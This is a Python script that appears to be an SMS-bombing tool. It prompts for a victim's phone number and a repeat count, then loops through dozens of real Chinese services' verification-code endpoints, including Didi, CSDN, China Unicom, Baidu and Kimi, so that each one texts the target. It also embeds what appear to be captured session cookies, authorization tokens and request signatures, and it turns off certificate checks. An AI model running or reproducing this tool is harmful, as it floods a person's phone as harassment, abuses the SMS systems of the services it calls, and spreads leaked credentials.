import requests
import json
import time

import urllib3
from urllib3.exceptions import InsecureRequestWarning
import warnings
# 屏蔽InsecureRequestWarning
warnings.simplefilter('ignore', InsecureRequestWarning)

# 获取当前时间戳
timestamp = str(int(time.time()))
print("当前时间戳：",timestamp)

phone = input("输入手机号：")
send_count = input("循环次数：")
send_count = int(send_count)
requests_array = []


def add_request(func):
    requests_array.append(func)
    return func













@add_request
def get_phone():  
    headers = {
        "user-agent": "Dart/2.16 (dart:io)",
        "accept-encoding": "gzip",
        "authentication": "",
        "host": "ddt.h3c.com"
    }
    url = f"https://ddt.h3c.com/scheme/app/verifyCode/{phone}?type=login"
    response = requests.get(url, headers=headers)
    return response.text

@add_request
def get_phone():  
    url = 'https://center.min2k.com/index.php?r=basic/get-auth-code'
    headers = {
        'Connection': 'keep-alive',
        'Content-Length': '31',
        'sec-ch-ua': '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
        'sec-ch-ua-platform': '"Windows"',
        'Origin': 'https://www.min2k.com',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.min2k.com/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Cookie': '_gcl_au=1.1.1971486433.1700923132; Hm_lvt_4372badca4ba75b0b76d58c94369dde1=1700923432; Hm_lpvt_4372badca4ba75b0b76d58c94369dde1=1700923432',
    }
    data = {
        'type': 201,
        'id': phone
    }
    response = requests.post(url, headers=headers, data=json.dumps(data))
    return response.text

@add_request
def get_sms_code():  
    url = 'https://www.kuannao.com/getSMSCode'
    headers = {
        'Host': 'www.kuannao.com',
        'content-length': '23',
        'sec-ch-ua': '"Chromium";v="118", "Android WebView";v="118", "Not=A?Brand";v="99"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-mobile': '?1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; M2011K2C Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded',
        'accept': '*/*',
        'origin': 'https://www.kuannao.com',
        'x-requested-with': 'mark.via',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://www.kuannao.com/register',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'cookie': 'PHPSESSID=uartkirtsgoudktno2kf5p053l'
    }
    data = {
        'phoneNumber': phone
    }
    response = requests.post(url, headers=headers, data=data)
    return response.text

@add_request
def get_code():  
    url = 'https://bot.zoodt.com/openai/index/get_code.htm'
    params = {
        'phone': phone
    }
    headers = {
        'Connection': 'keep-alive',
        'sec-ch-ua': '"Chromium";v="118", "Android WebView";v="118", "Not=A?Brand";v="99"',
        'Accept': 'application/json, text/plain, */*',
        'x-req-pwd': 'Y9AMx8YSN9dy9TaU7cmMfNmbkOgEaZNn0Sx0vUHJ8FT9V8FauO7X1jQh7im/zOsG3Dn/UEpg1sV1vzavzxQBRt7252DYxaJM3P4YQgyOOySHnUPgNobEqhDJk2jovVVrAvLyJVwcVTXwMIPAkw0CD7juYLphGELYNLVo6TlSiOE=',
        'x-request-by': 'web',
        'sec-ch-ua-mobile': '?1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; M2011K2C Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua-platform': '"Android"',
        'X-Requested-With': 'mark.via',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://bot.zoodt.com/login',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
    }
    response = requests.get(url, headers=headers, params=params)
    return response.text

@add_request
def get_phone():  
    url = 'https://882.sdx882.com/auth/code'
    headers = {
        'Connection': 'keep-alive',
        'Content-Length': '23',
        'sec-ch-ua': '"Chromium";v="118", "Android WebView";v="118", "Not=A?Brand";v="99"',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua-mobile': '?1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; M2011K2C Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua-platform': '"Android"',
        'Origin': 'https://882.sdx882.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://882.sdx882.com/?channelCode=',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cookie': 'device_id=fb1736a1baf1ae20afdfc4661b10c3a0; device_id=fb1736a1baf1ae20afdfc4661b10c3a0',
    }
    data = {
        'phone': phone
    }
    response = requests.post(url, headers=headers, data=json.dumps(data))
    return response.text

@add_request
def get_phone():  
    url = 'http://bj.wl-tg.com/index.php'
    params = {
        'c': 'Front/CustomForm',
        'a': 'sendsmsvcode',
        'mobile': phone
    }
    headers = {
        'Connection': 'keep-alive',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; M2011K2C Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'http://bj.wl-tg.com/Content/375874.html',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cookie': 'Lang=cn; InitSiteID=70263; Hm_lvt_61d38b6564f27efe844a4a4c1ff5b216=1700765054; Hm_lpvt_61d38b6564f27efe844a4a4c1ff5b216=1700765054; SiteType=1; IsDefaultLang=1; WUserID=16067525390937; PHPSESSID=f1614cae4756d965787a2e225eb97377; count_clientid=64e22a18ec673f85e7d8f691e2078d05; HadVisited=1'
    }
    response = requests.get(url, headers=headers, params=params)
    return response.text

@add_request
def get_phone():  
    url = "https://passport.csdn.net/v1/login/sendVerifyCode"
    data = {
        "code": "0086",
        "mobile": phone,
        "platform": "WAP",
        "type": "popupLogin",
        "spm": "1001.2101.3001.7902"
    }
    response = requests.post(url,json=data)
    return response.text

@add_request
def get_phone(): 
    url = "https://authentication-center-new.ennew.com/userCenter/unify/auth/getSmsCode"
    headers = {
        "Connection": "keep-alive",
        "sec-ch-ua": '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "assistCode": "747dbc1e98ee64f14c93e7ea452d6775",
        "sec-ch-ua-platform": "Windows",
        "Origin": "https://authentication-center-new.ennew.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://authentication-center-new.ennew.com/login?redirect=https%3A%2F%2Fjuan.cn%2FLogin%2Fcallback&appid=juan-order-service&terminalType=PC-WEB-CHROME&tenantPageName=juan",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Cookie": "csrfToken=JW30Xu1Z6Iw39fYoGz25Fxbr; _bfu_=83; _bl_uid=21lL2pOt2LFkLzxwOizepb6dFhwO"
    }
    payload = {
        "appId": "juan-order-service",
        "phoneNumber": phone,
        "type": "userCenter",
        "templateCode": "SMS_1666685116627423232"
    }
    response = requests.post(url, json=payload, headers=headers)
    return response.text

@add_request
def get_phone(): 
    url = "https://txjtsp.com/sendMsg/"+phone
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
    }
    response = requests.post(url, headers=headers)
    return response.text

@add_request
def get_phone(): 
    url = "https://gwdapi.ynjspx.cn/user-server/code/getValidateCode"
    headers = {
        "Connection": "keep-alive",
        "sec-ch-ua": '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "sec-ch-ua-mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "sec-ch-ua-platform": '"Windows"',
        "Origin": "https://education-gw-auth.ynjspx.cn",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://education-gw-auth.ynjspx.cn/",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Accept-Encoding": "gzip, deflate",
    }
    payload = {
        "request": {
            "codeType": 8,
            "mobilePhoneNumber": phone
        }
    }
    data = json.dumps(payload)
    response = requests.post(url, headers=headers, data=data)
    return response.text

@add_request
def get_phone(): 
    url = "https://rest-api.ymi.ai/api/bbs/user/sendSmsVerifyCode"
    params = {
        "phone": phone
    }
    response = requests.get(url,params=params,verify=False)
    return response.text

@add_request
def get_phone():
    url = 'http://115.236.87.228:8181/mall/login/checkPhone'
    data = {
        'telephone': phone,
        'type': 'login'
    }
    response = requests.post(url, data=data)
    return response.text

@add_request
def get_phone():  
    url = 'https://www.tanwan.com/api/h5/user.php'
    params = {
        'do': 'loginByPhoneCode',
        'phone': phone,
        'callback': 'jQuery11200061094751968051364_1600152277132',
        '_': '1600152277135'
    }
    response = requests.get(url,params=params)
    return response.text

@add_request
def get_phone():  
    url = 'http://mall.10010.com/mall-web/CheckMessage/captcha'
    headers = {
        'Connection': 'keep-alive',
        'Accept': '*/*',
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; M2011K2C Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://mall.10010.com',
        'Referer': 'http://mall.10010.com/goodsdetail/313211100202.html?ref=1',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
    }
    cookies = {
        'unicomMallUid': '2Tv5xwvHq5n79m8',
    }
    data = {
        'phoneVal': phone,
        'type': '31'
    }
    response = requests.post(url, headers=headers, cookies=cookies, data=data)
    return response.text

@add_request
def get_phone():  
    url = 'http://php.wenxuesucai.com/interface/bjsj/userCode/sendCode.php'
    headers = {
        'Connection': 'keep-alive',
        'sec-ch-ua': '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'application/json, text/plain, */*',
        'sec-ch-ua-platform': '"Windows"',
        'Origin': 'https://bjsj.wenxuesucai.com',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://bjsj.wenxuesucai.com/',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Accept-Encoding': 'gzip, deflate',
    }
    data = {
        'userId': '0',
        'project': 'bjsj',
        'token': '', 
        'phone': phone,
        'type': '1',
    }
    response = requests.post(url, headers=headers, data=data)
    return response.text

@add_request
def get_phone():
    url = 'http://wm.yuluojishu.com/api.captcha/getCaptcha'
    headers = {
        'sign': '36B49C0DBE41D26A903C849BADC01A04',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; M2011K2C Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/39.142857)',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': 'PHPSESSID=6b18671a2888ec3bda4bb1d6b5f5235a'
    }
    data = {
        'phone': phone,
        'type': '1'
    }

    response = requests.post(url, headers=headers, data=data, verify=False)
    return response.text


@add_request
def get_phone():
    url = "https://api.hqtime.huanqiu.com/api/sms/register"
    headers = {
        "Host": "api.hqtime.huanqiu.com",
        "user-agent": "(Linux; Android 13; Build/Xiaomi M2011K2C) huanqiuTIME/12.3.1",
        "accept": "application/vnd.hq_time.v3+json",
        "clientversion": "Android/v12.3.1",
        "x-timestamp": "1699685409",
        "x-nonce": "5r7rinlq",
        "x-sign": "943aab2abe939ce9406e9bdd13735855413f94465c61bc17eeb429cbed4608c9",
        "content-type": "application/json",
        "content-length": "24",
        "accept-encoding": "gzip"
    }

    data = {
        "mobile": phone
    }
    response = requests.post(url, headers=headers, json=data, verify=False)
    return response.text


@add_request
def get_phone():
    url = "https://id.ifeng.com/api/sendMsgByClick?gv=7.71.0&av=7.71.0&uid=v001jRzNlZ2M3MmMlFTM4EGM40QNgfr3r340gf&deviceid=v001jRzNlZ2M3MmMlFTM4EGM40QNgfr3r340gf&proid=ifengnews&os=android_33&df=androidphone&vt=5&screen=1440x3063&publishid=6001&nw=wifi&loginid=&token=&adAid=61c9582e63e10977&adAid2=&hw=xiaomi_m2011k2c&ps=1&es=1&uid2=e4db131c14644c81b319b692d5c9699e&vuid=a0f3db75a89f4ce782620173e1c5312a&st=16996850281336&sn=996c27cd10c296042f2aa41dfa1ecb05&sessionStartTime=1699684994594&grayv=446dd63de7"
    data = {
        "mobile": phone,
        "channel": "1",
        "platform": "c",
        "systemid": "7"
    }
    response = requests.post(url, data=data, verify=False)
    return response.text


@add_request
def get_phone():
    url = "https://user.daojia.com/mobile/getcode?cityid=1"
    data = {
        "uid": "",
        "bu": "101",
        "mobile": phone,
        "newVersion": "1"
    }
    response = requests.post(url, data=data, verify=False)
    return response.text


@add_request
def get_phone():
    url = "https://gateway.jrdaimao.com/easyhome-app-application/member/sendVerificationCode?dwSign=C09B792FC33FAAA10D76DE02A4B43686&requestTime=1699677975091"
    data = {
        "areaCode": "86",
        "phone": phone,
        "type": 1
    }
    response = requests.post(url, json=data, verify=False)
    return response.text


@add_request
def get_phone():
    url = "https://retailapi.shell.com.cn/ev/v1/shellcpop/mtsV2/wechat/account/sms"
    headers = {
        "Host": "retailapi.shell.com.cn",
        "Connection": "keep-alive",
        "authorization": "74e24272-bc06-4ea2-abe8-e02c7a6e0e4d",
        "charset": "utf-8",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; M2011K2C Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 MMWEBID/2892 MicroMessenger/8.0.30.2244(0x28001E44) WeChat/arm64 Weixin GPVersion/1 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "x-app": "miniprogram",
        "Referer": "https://servicewechat.com/wx163df4a5f7dc0f47/81/page-frame.html"
    }
    params = {
        "account": phone
    }
    response = requests.get(url, headers=headers, params=params, verify=False)
    return response.text


@add_request
def get_phone():
    url = "https://epassport.diditaxi.com.cn/passport/login/v5/codeMT?wsgsig=dd03-QQ%2BL1MvdYaCLnodgnI4TEZuBQhsK%2FK6blxCZ9YtGQhsJl%2BP3X2RSEIQgvBCJlyq9j6Gq02i9v%2F%2BItRSLnZKRGI7curiMlvOetZ%2BTEI3cva3Ikvkgkw4oa2ubpr%2F"
    headers = {
        "Host": "epassport.diditaxi.com.cn",
        "Connection": "keep-alive",
        "Content-Length": "355",
        "charset": "utf-8",
        "mpxlogin-ver": "5.4.18",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; M2011K2C Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 MMWEBID/2892 MicroMessenger/8.0.30.2244(0x28001E44) WeChat/arm64 Weixin GPVersion/1 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "content-type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wx06cb940499986937/386/page-frame.html"
    }
    data = "q=%7B%22api_version%22:%221.0.1%22,%22appid%22:50051,%22role%22:2,%22device_name%22:%22M2011K2C%22,%22sec_session_id%22:%22ClCkQTiEUZLfTMvg9lTwNgAYwNmgoBSO6jXwTJcrAVitszo6dtWfslnkfYBs0BLT%22,%22policy_id_list%22:[],%22ddfp%22:%22%22,%22wsgenv%22:%22%22,%22cell%22:%22" + phone + "%22,%22country_calling_code%22:%22%2B86%22,%22code_type%22:0,%22scene%22:1%7D"
    response = requests.post(url, headers=headers, data=data, verify=False)
    return response.text


@add_request
def get_phone():
    url = "http://wx.carenergynet.cn/w/cons/verifiyCode/ma/_send"
    headers = {
        "Host": "wx.carenergynet.cn",
        "Connection": "keep-alive",
        "Content-Length": "77",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; M2011K2C Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": "http://xiaox.carenergynet.cn",
        "X-Requested-With": "mark.via",
        "Referer": "http://xiaox.carenergynet.cn/",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    data = {
        "phoneNo": phone,
        "codeMode": 1,
        "type": 2,
        "appFrom": 249,
        "requestFrom": 1
    }
    response = requests.post(url, headers=headers, json=data, verify=False)
    return response.text


@add_request
def get_phone():
    url = "https://miniappapi.cegncn.com/security/ssomanage/sendLoginMsg"
    headers = {
        "Host": "miniappapi.cegncn.com",
        "Connection": "keep-alive",
        "Content-Length": "23",
        "authorization": "",
        "charset": "utf-8",
        "api-env-version": "prod2",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; M2011K2C Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 MMWEBID/2892 MicroMessenger/8.0.30.2244(0x28001E44) WeChat/arm64 Weixin GPVersion/1 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "app-type": "Applet",
        "auth-token": "",
        "Referer": "https://servicewechat.com/wx4e9c970db3cfd621/45/page-frame.html"
    }
    data = {
        "phone": phone
    }
    response = requests.post(url, headers=headers, json=data, verify=False)
    return response.text


@add_request
def get_phone():
    url = "http://wx.carenergynet.cn/api/sms/code/action/send"
    headers = {
        "Host": "wx.carenergynet.cn",
        "Connection": "keep-alive",
        "Content-Length": "46",
        "version": "v3.5",
        "Accept": "application/json, text/plain, */*",
        "from": "wx_mp",
        "opr": "24",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; M2011K2C Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": "http://wx.carenergynet.cn",
        "X-Requested-With": "mark.via",
        "Referer": "http://wx.carenergynet.cn/",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
        "Cookie": "cna=465eee0a7b714ba587ce7d6da76e6cf3; SERVERID=5952de1597c097ad11f9ef34628b8701|1699674054|1699674053"
    }
    data = {
        "mobile": phone,
        "codeMode": 1,
        "type": 2
    }

    response = requests.post(url, headers=headers, json=data, verify=False)
    return response.text


@add_request
def get_phone():
    url = "https://api.heimaohui.com/api/user/sendCaptcha"
    data = {
        "mobile": phone,
        "exist": 2
    }
    response = requests.post(url, json=data, verify=False)
    return response.text


@add_request
def get_phone():
    url = 'https://xiezuocat.com/verify?type=signup'
    data = {
        'phone': '86-' + phone
    }
    response = requests.post(url, json=data, verify=False)
    return response.text


@add_request
def get_phone():
    url = 'https://appwrite.heshixi.com/v1/functions/63fe2638de455234dc24/executions'
    headers = {
        'user-agent': 'com.aicommunity.word/2.0.2 (Linux; U; Android 13; Xiaomi M2011K2C)',
        'x-sdk-version': '8.2.2',
        'accept-encoding': 'gzip',
        'x-appwrite-response-format': '1.0.0',
        'content-type': 'application/json',
        'x-sdk-name': 'Flutter',
        'origin': 'appwrite-android://com.aicommunity.word',
        'cookie': 'a_session_63ebd56581f6f14ed680_legacy=eyJpZCI6IjY0MTcxMTgyNzlhZDFmNmNkZmI1Iiwic2VjcmV0IjoiYzA0MzIwMGJkMTIwYWQ2ZTBhMzUzNjBlOGQ2OTA4Y2Q2NjU5MGZhOTI5YTc4MDA4NGEyYjQ5MjFlNzM3YTRlZjZmZWVmYWJmYWM1YWMxYjk3NDUxNzFmMjBlOGRlOTg3ODY2ZjE4MDJlMzE4MjRkZmY1ZWFlNzA2ZTYwNWQwM2NkMjJmMWRlMjMxNzNlZDA5ZDJiNTY5ZjMyMWUyZmNiMzMxNDIxNDYzN2I4NzE2MDNjMjQzZTI1M2FhN2YwZjZhYTM4MzRmZjg3NjBiMDk3OWVhM2NmYTQzNzNmNjRlNjk0NTU3YmY3YTFiMzVhY2MyNzNlZTdiMTQ0NDhmZTBkYSJ9; a_session_63ebd56581f6f14ed680=eyJpZCI6IjY0MTcxMTgyNzlhZDFmNmNkZmI1Iiwic2VjcmV0IjoiYzA0MzIwMGJkMTIwYWQ2ZTBhMzUzNjBlOGQ2OTA4Y2Q2NjU5MGZhOTI5YTc4MDA4NGEyYjQ5MjFlNzM3YTRlZjZmZWVmYWJmYWM1YWMxYjk3NDUxNzFmMjBlOGRlOTg3ODY2ZjE4MDJlMzE4MjRkZmY1ZWFlNzA2ZTYwNWQwM2NkMjJmMWRlMjMxNzNlZDA5ZDJiNTY5ZjMyMWUyZmNiMzMxNDIxNDYzN2I4NzE2MDNjMjQzZTI1M2FhN2YwZjZhYTM4MzRmZjg3NjBiMDk3OWVhM2NmYTQzNzNmNjRlNjk0NTU3YmY3YTFiMzVhY2MyNzNlZTdiMTQ0NDhmZTBkYSJ9',
        'x-sdk-platform': 'client',
        'x-appwrite-project': '63ebd56581f6f14ed680',
        'x-sdk-language': 'flutter'
    }
    data = {
        'data': f'{{"phoneNumber": "{phone}"}}'
    }
    response = requests.post(url, headers=headers, data=json.dumps(data), verify=False)
    return response.text


@add_request
def get_phone():
    url = "https://kimi.moonshot.cn/api/user/sms/verify-code"
    payload = {
        "action": "register",
        "phone": phone
    }
    response = requests.post(url, json=payload, verify=False)
    return response.text


@add_request
def get_phone():
    url = "https://chat.link-ai.tech/api/get/verification/code"
    query_params = {'phoneNumber': phone}
    response = requests.get(url, params=query_params, verify=False)
    return response.text


@add_request
def get_phone():
    url = "https://danrongh5api.shihuak.com/api/users/sms/generateAuthCode"
    params = {
        "phone": phone,
        "type": "loginPhone"
    }
    headers = {
        "Host": "danrongh5api.shihuak.com",
        "sec-ch-ua": "\"Chromium\";v=\"118\", \"Android WebView\";v=\"118\", \"Not=A?Brand\";v=\"99\"",
        "contenttype": "json",
        "uuid": "07c537fe-64a7-671e-2435-21f79daba1d1",
        "channel": "yupvip-sms-18",
        "sign": "72514d6cab67a12c3d85c5e353756e9d",
        "gdtvid": "null",
        "sec-ch-ua-platform": "\"Android\"",
        "sourceplatform": "vipshop",
        "method": "GET",
        "source": "weapp",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 13; M2011K2C Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "timestamp": "1699294482805",
        "token": "07c537fe-64a7-671e-2435-21f79daba1d1",
        "saascode": "W9A8",
        "origin": "https://vipshop.quanminyanxuan.com",
        "x-requested-with": "mark.via",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://vipshop.quanminyanxuan.com/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    response = requests.get(url, params=params, headers=headers, verify=False)
    return response.text


@add_request
def get_phone():
    url = "https://jzapi.baidu.com/rest/form/c/sessions/441cc9f62ccd44fca3dd39f51d6a356d/verifications?reqid=4b534c47-5590-4315-349b-169929349111"
    headers = {
        "Host": "jzapi.baidu.com",
        "Connection": "keep-alive",
        "Content-Length": "1155",
        "sec-ch-ua": '"Chromium";v="118", "Android WebView";v="118", "Not=A?Brand";v="99"',
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "X-Fengming-Consumer-Code": "xcqexa",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; M2011K2C Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": '"Android"',
        "Origin": "https://qianhu.wejianzhan.com",
        "X-Requested-With": "mark.via",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://qianhu.wejianzhan.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
        "Cookie": "Your Cookie Information"
    }
    data = {
        "action": {
            # your action data
        },
        "verification": {"type": "sms"},
        "main_phone": phone,
        "_embedded": {
            "session": {}
        }
    }
    response = requests.post(url, headers=headers, data=json.dumps(data), verify=False)
    return response.text


@add_request
def get_phone():
    url = "https://jzapi.baidu.com/rest/form/c/sessions/698e72fb2ab942aca4f178c3e0361a1c/verifications?reqid=4b534c47-49c6-4c0a-c6f0-169929202355"
    headers = {
        "Host": "jzapi.baidu.com",
        "Connection": "keep-alive",
        "Content-Length": "1155",
        "sec-ch-ua": '"Chromium";v="118", "Android WebView";v="118", "Not=A?Brand";v="99"',
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "X-Fengming-Consumer-Code": "xcqexa",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; M2011K2C Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": '"Android"',
        "Origin": "https://qianhu.wejianzhan.com",
        "X-Requested-With": "mark.via",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://qianhu.wejianzhan.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
        "Cookie": "Your Cookie Information"
    }
    data = {
        "action": {
            # your action data
        },
        "verification": {"type": "sms"},
        "main_phone": phone,
        "_embedded": {
            "session": {}
        }
    }
    response = requests.post(url, headers=headers, data=json.dumps(data), verify=False)
    return response.text


@add_request
def get_phone():
    url = 'https://xxyx-client-api.xiaoxiaoyouxuan.com/sms_code'
    data = {"lat": 40.22077, "lng": 116.23128, "mobile": phone}
    response = requests.post(url, json=data, verify=False)
    return response.text


@add_request
def get_phone():
    url = 'https://www.moxiaoxian.art/frontis-gateway/frontis-auth-server/v1/authservice/user/verify_code/apply'
    data = {'mobileId': phone}
    response = requests.post(url, json=data, verify=False)
    return response.text


@add_request
def get_phone():
    url = 'https://api.talesofai.cn/v1/user/request-verification-code'
    data = {'phone_num': phone}
    response = requests.post(url, json=data, verify=False)
    return response.text


@add_request
def get_phone():
    url = 'https://www.tiamat.com/v1/getLoginVerificationCode'
    data = {'phone': phone}
    response = requests.post(url, json=data, verify=False)
    return response.text


@add_request
def get_phone():
    url = 'https://api.bosyun.cn/api/user/user/mobile/login/send-code'
    data = {'mobile': phone}
    response = requests.post(url, json=data, verify=False)
    return response.text


@add_request
def get_phone():
    url = "https://api.midjourney3.com/chat-api/user/getPhoneCaptcha"
    data = {"phone": phone}
    response = requests.post(url, json=data, verify=False)
    return response.text


def send_sms(send_count):
    while send_count > 0:
        count = 0
        for request in requests_array:
            response = request()
            count += 1
            print("当前接口 : ", count)
            print(response)
        send_count -= 1  # 在函数内部递减send_count
        

send_sms(send_count)